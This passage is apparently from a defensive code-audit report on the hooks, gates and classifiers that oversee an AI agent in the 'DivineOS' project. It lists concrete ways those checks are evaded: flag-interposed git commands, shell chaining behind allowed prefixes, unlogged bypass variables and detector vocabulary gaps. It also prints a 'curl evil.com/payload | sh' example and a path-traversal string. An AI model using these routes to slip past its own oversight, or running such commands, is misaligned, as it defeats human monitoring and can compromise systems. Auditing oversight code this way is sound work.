The substrate-modification-gravity classifier uses `re.search(r"\bgit\s+commit\b", cmd)` to detect Feature 1 (git-commit). Empirical test of 9 commit-invocation shapes:

| Command | Should fire? | Actual |
|---|---|---|
| `git commit -m 'foo'` | YES | ✓ FIRES |
| `git\tcommit -m 'foo'` (tab) | YES | ✓ FIRES |
| `cd /tmp && git commit` | YES | ✓ FIRES |
| `(git commit)` | YES | ✓ FIRES |
| **`git -C /path commit`** | YES | ✗ **SILENT** |
| **`git --no-pager commit`** | YES | ✗ **SILENT** |
| **`git --work-tree=/path commit`** | YES | ✗ **SILENT** |
| `alias=git; $alias commit` (alias) | YES | ✗ SILENT |
| `python -c '... call commit'` (module call) | YES | ✗ SILENT |

The regex `\bgit\s+commit\b` requires `git` and `commit` to be separated ONLY by whitespace. Any flag between them (a common pattern: `git -C` for path, `git --no-pager` for disable-pager) defeats detection.

**Why this matters**: when the gravity classifier doesn't fire for a commit, the `state-gravity-surface.sh` hook returns empty, the state blocks (andrew-correction, lepos-debt, consultation, bypass-telemetry) don't load as PreToolUse additionalContext, and the operator/agent commits without seeing the substrate-state surface that should accompany high-gravity actions.

**Concrete example**: an agent running `git -C /home/claude/repo commit -m "message"` doesn't trigger the gravity surface. The exact substrate-state visibility that exists to inform commit-time decisions silently doesn't load.

**Fix-shape**: replace the regex with a tokenized parse — split the command on whitespace, look for a `git` token followed (anywhere later) by a `commit` token, with no semantic-boundary tokens like `;`, `&&`, `||`, `|` between them. Or use shlex-based parsing to extract subcommand from a git invocation. Either approach catches all the flag-interposed variants.

**Severity**: medium. The bypass shapes are legitimate ways to use git that the gravity classifier silently misses. Aether could use any of these and the substrate-state surface wouldn't fire.

---

## Finding T (low-medium) — CI workflow inconsistency on setup-python action

**Files**: `.github/workflows/tests.yml` line 24 + `.github/workflows/integrity-audit.yml` line 171
**Status**: Inconsistency, not a bug

`tests.yml` uses `actions/setup-python@v4`. `integrity-audit.yml` uses `actions/setup-python@v5`. Same action, two different major versions.

**Why this matters**: not a security or correctness issue (both work), but a maintenance inconsistency. Two workflows updated by different commits at different times; not aligned afterwards. Indicates the CI workflows aren't being maintained as a coherent set.

**Fix-shape**: pick one version (probably v5, the newer one), update both. Add a lint rule (e.g., `actionlint`) to CI that flags version inconsistency across workflows.

**Severity**: low-medium. Not currently causing observable issues. Worth marking as a hygiene gap.

---

## Finding U (low) — all tests run with DIVINEOS_DISABLE_AUTO_REMEDIATE=1

**File**: `tests/conftest.py` line 60
**Status**: By-design test-harness fixture, but worth surfacing

The `_isolated_db` autouse fixture sets `DIVINEOS_DISABLE_AUTO_REMEDIATE=1` for every test:

```python
os.environ["DIVINEOS_DISABLE_AUTO_REMEDIATE"] = "1"
```

This prevents `body_awareness._auto_prune_cache` from running, which the codebase needs because xdist workers would otherwise delete each other's tmp directories.

**The implication**: the actual auto-remediate path (the default production behavior) is never exercised by the test suite. If there's a bug in the auto_remediate logic that only fires when the flag is NOT set, no test catches it.

**Empirical verification needed**: do any tests explicitly unset this flag to test the auto_remediate path? My sampled tests don't.

**Fix-shape**: add explicit tests for `body_awareness.body_check(auto_remediate=True)` that temporarily unset the env var (via monkeypatch). Or refactor `body_awareness` so the auto-remediate path is testable without needing to set/unset env vars.

**Severity**: low. The auto-remediate logic is straightforward cache pruning; bug-risk is low. But it's a coverage gap worth noting because it intersects with Finding B (untested substrate modules).

---

## Finding V (low-medium) — shell-script bypasses aren't logged through bypass-telemetry

**Files**: `scripts/check_push_readiness.sh` + `scripts/check_branch_freshness.sh` + `scripts/check_force_push_safety.sh`
**Status**: Architectural inconsistency

The `emergency_bypass.py` module exists specifically to LOG legitimate bypasses (the LOGGED → REPORTED → ADDRESSED → FIXED loop with mandatory ≥20-char reason). It's the canonical home for "legitimate operator bypasses that have visible cost."

But the shell-script bypasses (`DIVINEOS_SKIP_TESTS`, `DIVINEOS_SKIP_MULTIPARTY_CHECK`, `DIVINEOS_EMERGENCY_PUSH`, `DIVINEOS_SKIP_FRESHNESS_CHECK`, `DIVINEOS_FORCE_PUSH_OK`) bypass shell-script gates and DON'T fire through bypass_telemetry or emergency_bypass:

```bash
if [[ "${DIVINEOS_SKIP_TESTS:-0}" == "1" ]]; then
    # ... just skips, no logging
fi
```

vs Python-side bypass:
```python
if reason:
    emergency_bypass.record_emergency_use(reason)  # logs, files claim, etc.
```

**The asymmetry**: bypasses in Python code have visible cost (logged, claim filed, structural-fix obligation). Bypasses in shell scripts have NO cost (silent skip). The shell-script bypasses are the most commonly-used ones (every operator who runs `DIVINEOS_SKIP_TESTS=1 git push` because tests are flaking).

**Why this matters**: the architecture's promise is "bypass requires named-reason, leaves an audit trail." Shell-script bypasses break this promise. The most-used bypass paths are also the ones with no visibility.

**Fix-shape**: shell-script bypasses should call into Python to log via emergency_bypass:
```bash
if [[ "${DIVINEOS_SKIP_TESTS:-0}" == "1" ]]; then
    REASON="${DIVINEOS_SKIP_TESTS_REASON:-}"
    if [ -z "$REASON" ]; then
        echo "DIVINEOS_SKIP_TESTS=1 requires DIVINEOS_SKIP_TESTS_REASON" >&2
        exit 30
    fi
    python -c "from divineos.core.emergency_bypass import record_emergency_use; record_emergency_use('DIVINEOS_SKIP_TESTS', '$REASON')"
fi
```

This makes the shell-script bypass have visible cost just like Python bypasses.

**Severity**: low-medium. Not a security or correctness bug. Architectural consistency gap that lets the most-used bypass paths escape the visible-cost discipline.

---

## Finding W (medium) — `store_knowledge` dedup silently ignores caller-provided maturity

**File**: `src/divineos/core/knowledge/crud.py` lines 96-115
**Status**: Real — verified by code inspection

When `store_knowledge` is called with content that already exists (non-superseded), the dedup path:
```python
existing = conn.execute(
    "SELECT knowledge_id FROM knowledge WHERE content_hash = ? AND superseded_by IS NULL",
    (content_hash,),
).fetchone()

if existing:
    conn.execute(
        "UPDATE knowledge SET access_count = access_count + 1, updated_at = ? WHERE knowledge_id = ?",
        (now, existing[0]),
    )
    conn.commit()
    return str(existing[0])
```

The caller-provided `maturity`, `confidence`, `tags`, `source`, `memory_kind` arguments are **silently ignored**. Only access_count and updated_at are bumped.

**Asymmetry with extraction path** (`src/divineos/core/knowledge/extraction.py` lines 165-190): on duplicate hit, extraction.py calls `increment_corroboration` + `promote_maturity`. So the extraction path handles dedup with proper corroboration semantics; the direct API path doesn't.

**Failure shape**:
1. Aether calls `store_knowledge(content="X", maturity="RAW")` → stored with RAW
2. Later, Aether calls `store_knowledge(content="X", maturity="CONFIRMED")` (after verification)
3. Dedup hits the existing entry, returns existing ID, maturity stays RAW
4. The promotion intent in the second call is silently lost
5. No error, no log line — the caller can't tell their maturity argument was ignored

This is the same shape as the historical bug Andrew caught ("seed maturity values silently demoted to RAW on every application"). The fix that landed was `reclassify_seed_as_inherited` — an EXPLICIT separate path for fixing maturity post-hoc. The underlying API behavior wasn't changed.

**Fix-shape**:
- Option A: store_knowledge raises ValueError if caller passes maturity that differs from existing entry's maturity
- Option B: store_knowledge UPGRADES maturity (never DOWNGRADES) on dedup if caller-provided maturity is higher per the promotion hierarchy
- Option C: store_knowledge calls increment_corroboration on dedup (same as extraction.py), so corroboration count grows even via the direct API

Option B is probably the safest: silently honoring upgrades closes the gap without introducing new error paths.

**Severity**: medium. The seed-reclassification path handles seed-specific cases. Direct API callers (CLI tools, programmatic ingestion) hit the silent-ignore-maturity behavior with no warning.

---

## Finding X (medium) — `_passes_validity_gate` fails-OPEN on broad exception class

**File**: `src/divineos/core/knowledge_maintenance.py`
**Status**: Real — by-design backward-compat with too-broad scope

```python
_KM_ERRORS = (ImportError, sqlite3.OperationalError, OSError, KeyError, TypeError, ValueError)

def _passes_validity_gate(knowledge_id, current, target, corroboration_count=0):
    try:
        from divineos.core.logic.logic_validation import can_promote
        return can_promote(knowledge_id, current, target, corroboration_count)
    except _KM_ERRORS:
        # Logic tables may not exist yet — allow promotion (backward compat)
        return True
```

**The intent** (from comment): "Logic tables may not exist yet — allow promotion (backward compat)" — this catches ImportError when the logic module isn't deployed.

**The actual behavior**: ANY exception in the `_KM_ERRORS` tuple makes the validity gate return True (allow promotion). This includes:
- `KeyError` — a bug in `can_promote` accessing a missing dict key → silent allow
- `TypeError` — a bug in `can_promote` with wrong argument type → silent allow
- `ValueError` — a bug in `can_promote` with invalid value → silent allow
- `sqlite3.OperationalError` — the validity DB has a real problem → silent allow

The exception class is over-broad for the documented intent. Bugs in the validity logic itself are caught and silently allow promotion — which is the opposite of fail-closed for a validity GATE.

**Why this matters**: this is the second of the two-gate promotion check (the other is `check_promotion`). If validity bugs allow promotion that shouldn't pass, knowledge entries can advance to ESTABLISHED / CONFIRMED maturity without satisfying the warrant requirements. The promotion would look legitimate but isn't.

**Fix-shape**:
1. Narrow the except clause: catch ONLY ImportError (the documented intent) and let other exceptions propagate
2. Add logging: when the validity gate is bypassed via fail-OPEN, log a warning so the operator can investigate
3. Distinguish "logic tables don't exist" (early-deployment, allow) from "logic tables exist but threw an error" (real bug, deny)

**Severity**: medium. The gate IS structurally present; under bug conditions it silently fails-OPEN. Bugs in validity logic become invisible.

---

## Finding Y (low-medium) — `store_knowledge` can resurrect superseded content

**File**: `src/divineos/core/knowledge/crud.py` lines 105-118
**Status**: Real — direct API path lacks the supersession guard that extraction.py has

The dedup query filters to non-superseded:
```python
existing = conn.execute(
    "SELECT knowledge_id FROM knowledge WHERE content_hash = ? AND superseded_by IS NULL",
    (content_hash,),
).fetchone()

if existing:
    # bump access_count and return
    ...
# Otherwise: INSERT new row with the same content_hash
```

**Failure shape**:
1. Aether stores knowledge entry K with content "X"
2. Later, K is superseded by K' (Andrew correction, revised understanding, etc.). K's row stays in DB with `superseded_by = K'.id`
3. Aether (or a CLI tool, or apply_seed in 'full' mode) calls `store_knowledge(content="X", ...)` again
4. The dedup query filters to `superseded_by IS NULL` — doesn't find K (it's superseded)
5. A new entry K2 is created with the same content_hash as K
6. Now the DB has K (superseded) AND K2 (active, fresh) for the same content
7. The supersession's intent is silently undone — content that was deliberately retired comes back as fresh "new" knowledge

**Contrast with extraction.py** (line 167-175):
```python
all_with_hash = conn.execute(
    "SELECT knowledge_id, knowledge_type, superseded_by FROM knowledge WHERE content_hash = ?",
    (content_hash,),
).fetchall()

for kid, ktype, superseded_by in all_with_hash:
    ...
    if superseded_by is not None:
        # This exact content was previously superseded — don't resurrect it
        logger.debug(f"Skipping superseded duplicate: {content[:60]}")
        return ""
```

Extraction.py EXPLICITLY guards against resurrection. crud.py doesn't.

**Real-world trigger**: apply_seed in 'merge' mode does check superseded content (line 175-185) and skips matching entries — so the seed path is protected. But ANY OTHER caller of store_knowledge (CLI tools, programmatic ingestion, future code) lacks this guard.

**Fix-shape**: lift extraction.py's superseded-check into store_knowledge — either as a default behavior, or via a `allow_resurrect=False` parameter so callers can opt into resurrection explicitly.

**Severity**: low-medium. Currently not observed in production behavior (apply_seed has its own guard; extraction path has the guard; the unguarded crud.py path may not be heavily used). Latent bug class — a future feature that calls store_knowledge directly without knowing about the supersession concern would silently undo supersession.

---

## Finding Z (low) — apply_seed dedup is case-insensitive; store_knowledge dedup is case-sensitive (hash)

**Files**: `src/divineos/core/seed_manager.py` line 193 + `src/divineos/core/knowledge/crud.py` line 96
**Status**: Cross-layer semantic disagreement

`apply_seed`:
```python
existing_contents = set()
for entry in get_knowledge(limit=1000):
    existing_contents.add(entry["content"].strip().lower())  # case-folded
...
if content.lower() in existing_contents:
    counts["skipped"] += 1
    continue
```

`store_knowledge`:
```python
content_hash = compute_hash(content)  # case-sensitive
existing = conn.execute(
    "SELECT knowledge_id FROM knowledge WHERE content_hash = ? AND superseded_by IS NULL",
    (content_hash,),
).fetchone()
```

apply_seed considers two contents duplicate if they differ only in case. store_knowledge considers them DIFFERENT (different content_hash).

**Concrete divergence**: 
- DB has entry with content "Always read files before editing."
- Seed re-application includes entry with content "always read files before editing." (lowercased)
- apply_seed: case-folded match → skip
- store_knowledge if called directly: case-sensitive hash mismatch → INSERT duplicate

**Why this matters**: two layers of dedup don't agree on what counts as duplicate. In practice (real entries don't differ in case), this doesn't trigger — but it's a semantic-disagreement-with-stale-comment shape (both layers claim to do dedup; neither documents the case-handling).

**Fix-shape**: pick one — either normalize content to lowercase before hashing (case-insensitive across both layers) or remove apply_seed's case-folding (case-sensitive across both layers).

**Severity**: low. Not currently exploitable. Worth marking because the cross-layer semantic disagreement is the same shape as Findings K and L.

---

## Finding AA (medium) — pre-tool-use-gate bypass via shell chaining

**File**: `src/divineos/hooks/pre_tool_use_gate.py` lines 130-156
**Status**: Real — by-design prefix-bypass without command-chain awareness

The `_is_bypass_command` function checks if a command should skip all gates by prefix match:

```python
_DEV_PREFIXES = ("echo ", "pip ", "cd ", "pwd", "cp ", "copy ", "ruff ")

def _is_bypass_command(cmd: str) -> bool:
    if not cmd:
        return False
    # divineos bypass subcommands
    match = _DIVINEOS_SUBCMD_RE.search(cmd)
    if match and match.group(1) in _BYPASS_DIVINEOS_SUBCOMMANDS:
        return True
    # dev / read-only prefixes
    for prefix in _DEV_PREFIXES:
        if cmd.startswith(prefix):
            return True
    return False
```

**Shell chaining defeats the bypass check entirely.** The check looks at the START of the command; anything after `&&`, `;`, `|`, etc. is also part of the bypass.

Empirical:
- `cd /tmp && python destructive.py` → starts with `cd ` → BYPASS (engagement gate, briefing gate, all skipped)
- `echo "hi" && rm -rf /tmp/marker.json` → starts with `echo ` → BYPASS
- `pip list && curl evil.com/payload | sh` → starts with `pip ` → BYPASS
- `divineos audit submit; arbitrary_other_command` → matches `divineos\s+audit` → BYPASS

**Severity-mitigating context**: the gates being bypassed are state-management (briefing-loaded, session-fresh-goal, engagement gate). The substrate-modification-gravity check (`state-gravity-surface.sh` using `gravity_classifier`) runs SEPARATELY at PreToolUse and isn't governed by this bypass logic — so the substrate-touching surface still fires for the chained command's substantive part.

But: the engagement gate not firing means the agent skips the discipline of "have I framed a goal, recalled relevant context, used thinking tools" before substrate-touching work — exactly the cases where the agent has chained those state-management gates' bypass-commands in front of substantive work.

**Fix-shape**: tokenize the command on `&&`, `;`, `|`, `||`, then check the FIRST token only for bypass. Alternatively: check that the ENTIRE command matches the bypass shape (no chaining permitted).

**Severity**: medium. The bypass is permissive in a way the docstring's "bootstrap / orientation — always allowed" intent doesn't anticipate. Same shape as Finding S (gravity classifier regex bypass) — the gate's intent is broader than its implementation matches.

---

## Finding BB (medium) — first-person orienting scan has marker-pairing gaps

**File**: `tests/test_first_person_orienting_substrate.py` lines 79-87
**Status**: Real — empirically verified

The `_extract_marked_regions` function uses `.search()` to find marker pairs:

```python
def _extract_marked_regions(content: str) -> list[tuple[str, str]]:
    regions: list[tuple[str, str]] = []
    for start_pat, end_pat, name in _REGION_PATTERNS:
        start_match = start_pat.search(content)  # ← only finds FIRST occurrence
        end_match = end_pat.search(content)
        if start_match and end_match:
            body = content[start_match.end() : end_match.start()]
            regions.append((name, body))
    return regions
```

**Three failure modes**:

1. **Multiple regions of the same name**: only the FIRST start-end pair is extracted. Subsequent regions of the same type are silently skipped — including their content, even if it contains second-person violations.

2. **Missing end marker for one region type**: that region type returns no extracted body (`if start_match and end_match` fails). The `test_orienting_files_have_marked_regions` requires "at least one marked region per orienting file" — but with two region types defined, only one needs intact markers for this guardian test to pass.

3. **Interleaved markers** (start-A, end-B, start-B, end-A): `.search()` returns first occurrence of each pattern. The extracted region for type A spans from start-A.end() to end-A.start() — but end-A may be after end-B and start-B, including markers of type B inside the region. Weird but not exploitable.

**Empirical verification** (run with controlled inputs):
```
Multiple-region test: extracted 1 region(s)  ← second region silently skipped
Missing-end-marker test: extracted 1 region(s)  ← broken region type silently skipped
```

The first test had a second region with the exact text "You are the agent. SECOND person. Bad! Should fail." — the scanner silently bypassed it.

**Why this matters**: the first-person orienting substrate is a Andrew-2026-05-19 load-bearing identity-claim discipline. The whole point of this enforcement is to keep second-person from creeping back into orienting text. A future CLAUDE.md edit that adds a second region with the same marker name OR removes an end marker would silently re-open the gap the test exists to close.

**Current state**: CLAUDE.md has exactly 1 of each of the 4 markers. The gap is latent — works correctly for current content; fails silently if future edits hit either pattern.

**Fix-shape**:
1. Use `.finditer()` instead of `.search()` to find all start markers; pair each with the next end marker by position
2. Add a test: count of start markers must equal count of end markers for each pattern type
3. Add a test: number of extracted regions must equal number of start markers found

**Severity**: medium. Currently working but the discipline's enforcement is brittle to specific edit shapes that defeat it.

---

## Finding CC (medium) — two event validators with different rules

**Files**: `src/divineos/event/event_validation.py` (regex-based) + `src/divineos/event/event_capture.py` (dataclass-based)
**Status**: Real architectural divergence; 59 direct callers use only the lenient validator

There are TWO event-validation systems in active use:

1. **`EventValidator.validate_payload(event_type, payload) → (bool, str)`** in `event_validation.py`. Regex-based, lenient (many fields optional). Used by:
   - `core/ledger.py:286` — every `log_event` call
   - `core/ledger_verify.py:186, 252` — ledger integrity verification

2. **`validate_event_payload(EventType, payload) → raises EventValidationError`** in `event_capture.py`. Dataclass-based, strict (requires all fields, runs `.validate()` method). Used by:
   - `event/event_emission.py` — only the 6 `emit_*()` functions

**The divergence is concrete.** Comparing `USER_INPUT` validation:

| Field | Dataclass (event_capture) | EventValidator (event_validation) |
|---|---|---|
| `content` | required, non-empty, ≤1MB | required, must pass `is_valid_content` |
| `timestamp` | **required**, ISO8601 via `datetime.fromisoformat` | **optional**, regex if present |
| `session_id` | **required**, non-empty | **optional**, non-empty if present |

So a `USER_INPUT` payload with `{"content": "hi"}` (no timestamp, no session_id) would be:
- REJECTED by dataclass (missing required fields)
- ACCEPTED by EventValidator (those fields are optional)

**The 59 direct log_event callers** (clarity_system, doctor_commands, pipeline_phases, ledger_commands, hud_commands, etc.) bypass the dataclass validator entirely. Their payloads only go through the lenient EventValidator. Same event type → different validation rules depending on call site.

**Practical consequence**: data integrity isn't uniformly enforced. A direct log_event call can persist an event that wouldn't pass the strict validator. Downstream readers expecting dataclass-strict shape (timestamp always present, session_id always present, ISO8601 via fromisoformat-parsable) can encounter payloads that don't meet those expectations.

**Fix-shape**: pick ONE validator. Either:
- Make all emit_* functions use the lenient EventValidator (matching the 59 direct callers)
- Make log_event also call the strict dataclass validator (catches the 59 direct callers)
- Or: consolidate into a single validator with one set of rules

The current state has two systems that drifted apart without consolidation.

**Severity**: medium. No currently-observed integrity issue (the divergence is in tolerance, not in core fields). The latent risk: a bug in one validator that the other catches stays uncaught for code paths that only use the buggier one.

---

## Finding DD (medium) — structural-fix-shape detector misses many adjacent vocabulary forms

**File**: `src/divineos/core/structural_fix_tracker.py` lines 35-65
**Status**: Real — empirically verified

The detector exists to catch the failure-mode Andrew named 2026-05-14: filing `learn` entries that name structural fixes the agent should build, then treating the filing as if it were the fix. The regex patterns:
- `\bstructural fix(?:es)?\b`
- `\bstructural change\b`
- `\bthe (?:actual|real) fix (?:is|would be)\b`
- `\b(?:should|need to|going to|will)\s+build\b`
- `\bto prevent recurrence\b`
- `\bbuild(?:s|ing)?\s+(?:a|the|an)\s+(?:detector|gate|check|test|monitor|surface|probe)\b`

Empirical test of 13 phrase variants showed several promise-shapes that escape:

| Phrase | Should fire? | Actual |
|---|---|---|
| "structural fix to prevent X" | YES | ✓ FIRES |
| "I should build a detector" | YES | ✓ FIRES |
| **"we ought to construct a detector"** | YES | ✗ silent (construct not in regex) |
| **"I'll create a check"** | YES | ✗ silent (create not in regex) |
| **"a structural countermeasure"** | YES | ✗ silent (countermeasure not in patterns) |
| **"the systemic fix is"** | YES | ✗ silent (systemic not "structural") |
| **"a structural intervention"** | YES | ✗ silent (intervention not in patterns) |
| **"a proper fix would be"** | YES | ✗ silent (proper not "actual/real") |

**Why this matters**: the detector exists specifically to prevent the filing-as-fix slip. An agent promising structural work via "I'll create a check" or "we need a countermeasure" slips past the detector and the `learn` entry isn't routed into the pending-fix tracker. The fix-promise becomes a record-without-follow-through — the exact pattern the detector was built to break.

Some false positives too: "the structural fix already exists" FIRES (despite being a REPORT, not a promise). Less damaging than false negatives but adds noise.

**Fix-shape**: broaden vocabulary. Add to verb set: `construct|create|implement|add|introduce|put in place|set up`. Add to noun set: `countermeasure|intervention|safeguard|barrier`. Distinguish past-tense report ("the structural fix exists") from future-tense promise ("the structural fix is/will be").

**Severity**: medium. Same shape as Finding P (attribution-audit narrow scope) and Finding S (gravity classifier git-flag bypasses): detector built for one vocabulary set; adjacent vocabulary escapes. The discipline is partial.

---

## Finding EE (low-medium) — `check_closure_claim.py` bypasses `divineos_home()`

**File**: `scripts/check_closure_claim.py` line 60
**Status**: Real — direct `Path.home()` usage bypasses the canonical home resolver

The verifier-runs log path is hardcoded:
```python
_VERIFIER_LOG_PATH = Path.home() / ".divineos" / "verifier_runs.jsonl"
```

This bypasses the canonical `paths.divineos_home()` resolver, which honors:
1. `DIVINEOS_HOME` env var (tests, explicit override)
2. Per-clone `.divineos_data_home` marker (worktree-local override)
3. Worktree-parent marker
4. Default `~/.divineos`

**Failure shapes**:
1. **Tests** running this script directly via shell would write to the real `~/.divineos/verifier_runs.jsonl`, not to the test-isolated `tmp_path` that DIVINEOS_HOME points to. Pollutes the operator's real state. (The Python test file `test_closure_claim_gate.py` monkeypatches `_VERIFIER_LOG_PATH` for tests, so the in-Python test path is safe. The shell-precommit path isn't.)
2. **Per-clone setups** (the Aria-host-clone work from 2026-05-17 that motivated `.divineos_data_home`): verifier_runs.jsonl is shared across all clones even when the rest of state is per-clone. A precommit verification in clone A would satisfy a closure-claim gate in clone B — false-confidence-via-cross-clone-contamination.

**Counter-argument**: the reader and writer agree with each other (both use `Path.home()`). So within a single user-home, the gate works correctly. The issue is only that the override mechanism (DIVINEOS_HOME, per-clone marker) is silently ignored by this gate.

**Why this matters more than it looks**: the canonical home resolver exists for a documented reason. Bypassing it leaks the same class of failure ("path reconstructed independently across 20+ modules") that motivated centralizing the resolver. One file now leaks the same pattern.

**Fix-shape**: import and use `paths.divineos_home() / "verifier_runs.jsonl"` instead of `Path.home() / ".divineos" / "verifier_runs.jsonl"`. One-line change. The closure-claim gate becomes per-clone/test-isolated correctly.

**Severity**: low-medium. Currently working for single-user-home cases. Per-clone setups have a latent cross-clone-contamination concern; tests have a latent state-pollution concern.

---

## Finding FF (low) — `marker_path(name)` accepts arbitrary string without traversal validation

**File**: `src/divineos/core/paths.py` line 140
**Status**: Defense-in-depth gap; no current exploitable callers

```python
def marker_path(name: str) -> Path:
    return divineos_home() / name
```

The function appends `name` to `divineos_home()` without validating that `name` doesn't contain path-traversal characters (`..`, absolute paths, slashes that escape the directory).

If a future caller passed `name = "../../etc/passwd"`, the result would be `~/.divineos/../../etc/passwd` = `~/etc/passwd` after Path resolution. If `name = "/etc/passwd"`, the result would be `/etc/passwd` (absolute paths override the prefix in `/` concatenation).

**Current callers**: all 18 callers I checked use string literals like `"checkpoint_state.json"`, `"operating_loop_findings.json"`, `"pending_structural_fixes.json"`, etc. NO user-controlled data reaches this function today.

**Why this is worth flagging anyway**: future callers might. If a CLI command ever accepts a marker name from operator input or from a config file, the traversal protection isn't there. Defense-in-depth would add validation: assert `name` doesn't start with `/`, doesn't contain `..`, doesn't contain backslashes.

**Fix-shape**: add at top of function:
```python
if "/" in name or "\\" in name or ".." in name or name.startswith("."):
    raise ValueError(f"marker name must be a simple filename, got {name!r}")
```

**Severity**: low. Theoretical — no current attack vector. Defense-in-depth for future safety.

---

## Finding GG (medium) — post_tool_use_checkpoint state has race + non-atomic write

**File**: `src/divineos/hooks/post_tool_use_checkpoint.py` lines 95-110
**Status**: Real — read-modify-write without locking or atomic write

The checkpoint hook reads state, modifies, writes back:
```python
def _load_state():
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
        return data
    except (OSError, json.JSONDecodeError):
        return {"edits": 0, "tool_calls": 0, "last_checkpoint": 0, "checkpoints_run": 0}

def _save_state(state):
    try:
        _state_path().write_text(json.dumps(state, indent=2), encoding="utf-8")
    except OSError:
        pass
```

**Three problems**:

1. **No locking**: concurrent PostToolUse hooks can both read the same state, both increment, both write — one increment silently lost. Under parallel tool calls (which Claude Code can issue), the edit counter drifts below the actual edit count.

2. **No atomic write**: `path.write_text(...)` is NOT atomic. If the process is killed mid-write (signal, OOM, parent timeout), the state file is half-written. The `_load_state` catches `json.JSONDecodeError` and silently resets to `{edits: 0, tool_calls: 0, ...}` — state is silently cleared.

3. **Threshold-based checkpoint triggers can silently never fire**. The hook runs `divineos checkpoint` when edits crosses a 15-multiple. If the edit counter is reset to 0 via corruption (case 2 above) or undercount via race (case 1 above), the threshold is never reached, no checkpoint runs.

**Same shape as Finding N** (atomic_write_text race) but at a different layer. atomic_io.py was specifically built to solve this class of issue for markers in core/. The checkpoint state file in hooks/ didn't get the fix.

**Concrete failure scenario**:
1. Aether does Edit, Edit, Edit, Edit, Edit (5 edits in quick succession, concurrent PostToolUse hooks)
2. Hook A: reads {edits:5}, writes {edits:6}
3. Hook B: reads {edits:5} (before A's write), writes {edits:6}
4. Hook C: reads {edits:6}, writes {edits:7}
5. Hook D: reads {edits:6} (before C's write), writes {edits:7}
6. Hook E: reads {edits:7}, writes {edits:8}
7. Actual edits: 5. Counter shows: 8. Wait — actually undercount, not overcount.

Let me redo: 5 edits, but at most 3 increments visible due to race losses. Counter ends at maybe 8 (5 distinct reads + 5 writes but losing duplicates). Mostly undercount.

The point: the counter is unreliable under concurrent access. Threshold-based logic on top of unreliable counters can either miss thresholds or fire too late.

**Fix-shape**: 
1. Use `atomic_write_text` (from atomic_io.py) for the save
2. Add file-level locking (fcntl on POSIX, msvcrt on Windows) for the read-modify-write cycle
3. Or: use a SQLite-based counter (which provides ACID via the WAL+busy_timeout the canonical connection has)

**Severity**: medium. The checkpoint discipline (run consolidation every 15 edits) depends on this counter being accurate. Under concurrent tool calls or process crashes, the counter is unreliable.

---

## Finding HH (low-medium) — `record_code_action` has same race shape

**File**: `src/divineos/core/hud_handoff.py` lines 102-130
**Status**: Real — same shape as Finding GG, different counter

The engagement-gate counters (`code_actions_since`, `deep_actions_since`, `compass_actions_since`) live in `.session_engaged` marker file:

```python
marker = json.loads(path.read_text(encoding="utf-8"))
marker["code_actions_since"] = marker.get("code_actions_since", 0) + 1
marker["deep_actions_since"] = marker.get("deep_actions_since", 0) + 1
marker["compass_actions_since"] = marker.get("compass_actions_since", 0) + 1
path.write_text(json.dumps(marker), encoding="utf-8")
```

Same read-modify-write race, same non-atomic write. Counters can drift below actual count under concurrent PostToolUse calls.

**Why this matters more than just "race condition"**: these counters gate engagement discipline:
- `code_actions_since` triggers the LIGHT engagement gate (any thinking command clears it)
- `deep_actions_since` triggers the DEEP engagement gate (only ask/recall/briefing clears it)
- `compass_actions_since` triggers the compass-staleness gate (compass-ops observe clears it)

Under concurrent access, counters drift low → gates fire LESS OFTEN than they should. The discipline of "think between writes" can be silently relaxed by a race.

**Fix-shape**: same as Finding GG — atomic write + locking, or SQLite-based counters.

**Severity**: low-medium. Same underlying issue as Finding GG. Same fix.

---

## Finding II (low) — `predictive_session._ACTION_PATTERNS` repeats the git-flag bypass shape

**File**: `src/divineos/core/predictive_session.py` line 102
**Status**: Real — same regex bug as Finding S, different module

The trajectory-learning action-extraction regex:
```python
_ACTION_PATTERNS = {
    "read": re.compile(r"read", re.IGNORECASE),
    "edit": re.compile(r"edit|write", re.IGNORECASE),
    "test": re.compile(r"pytest|test", re.IGNORECASE),
    "commit": re.compile(r"git commit|git push", re.IGNORECASE),  # ← same bug as Finding S
    "search": re.compile(r"grep|glob|search|find", re.IGNORECASE),
    "run": re.compile(r"bash|command|run", re.IGNORECASE),
}
```

The `commit` pattern is `git commit|git push`. Same shape as the gravity classifier's regex (Finding S). Does NOT match:
- `git -C /path commit`
- `git --no-pager commit`
- `git --work-tree=/path commit`

Trajectory-learning miscounts commits when these invocations are used. The "after every edit you commit" pattern detection might miss the commit step.

**Also**: the `run` pattern matches the word "run" anywhere — extremely broad, will fire on phrases like "the command to run is foo" with false-positive frequency.

**Severity**: low. Trajectory learning is heuristic; false negatives just mean a pattern goes undetected. Worth flagging because it's the SAME regex bug in TWO different modules — fixing one needs to fix both. Defense-in-depth: a shared `is_git_commit(cmd)` utility used by both gravity_classifier and predictive_session would close both at once.

---

## Finding JJ (low) — conftest fixture uses direct os.environ manipulation

**File**: `tests/conftest.py` lines 53-63
**Status**: Test-isolation hygiene concern

The `_isolated_db` autouse fixture directly mutates `os.environ`:
```python
os.environ["DIVINEOS_DB"] = str(db_path)
os.environ["DIVINEOS_HOME"] = str(home_path)
os.environ["DIVINEOS_DISABLE_AUTO_REMEDIATE"] = "1"
...
yield
os.environ.pop("DIVINEOS_DB", None)
os.environ.pop("DIVINEOS_HOME", None)
os.environ.pop("DIVINEOS_DISABLE_AUTO_REMEDIATE", None)
```

**Issues with this approach vs `monkeypatch.setenv`**:

1. **Doesn't restore prior values**: if `DIVINEOS_DB` was already set to something else before the test (e.g., CI environment), it's lost. `monkeypatch.setenv` saves/restores the prior value automatically.

2. **Partial-failure leakage**: if the fixture errors between setting DIVINEOS_DB and setting DIVINEOS_HOME (e.g., `init_db()` raises), pytest doesn't run the yield's cleanup. DIVINEOS_DB leaks to subsequent tests.

3. **Inconsistent with the 423 other monkeypatch operations in the test suite** — same fixture is mixing two styles.

**Why this hasn't bitten yet**: tests generally don't set DIVINEOS_DB before the test runs, so there's nothing to restore. `init_db()` typically doesn't fail. The fixture works in practice.

**Fix-shape**: convert to `monkeypatch.setenv("DIVINEOS_DB", str(db_path))` etc. Automatic teardown. Restores prior values. ~5 lines simpler.

**Severity**: low. Hygiene gap; not currently causing observable issues.

---

## Finding KK (medium) — state-file race condition is pervasive (29 modules)

**Scope**: `src/divineos/` — 29 modules
**Status**: Meta-finding. Findings GG, HH, and N are specific instances.

